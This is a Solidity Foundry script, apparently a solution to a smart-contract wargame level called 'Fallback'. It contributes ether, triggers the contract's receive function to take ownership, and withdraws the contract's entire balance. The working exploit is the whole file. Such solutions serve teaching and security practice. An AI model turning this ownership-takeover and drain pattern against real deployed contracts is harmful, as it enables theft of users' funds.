// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/2-Fallback.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    Fallback fallbackContract = Fallback(payable(0xB8772F0968B5CbCA6b9A5170A8cb32cd4FC31c73));

    function run() external{
        vm.startBroadcast();

        // `contribute()` so `contributions[msg.sender] > 0` is satisfied
        fallbackContract.contribute{value: 0.0009 ether}();

        // hit receive function
        address(fallbackContract).call{value: 0.0009 ether}("");

        // withdraw funds
        fallbackContract.withdraw();

        vm.stopBroadcast();
    }
}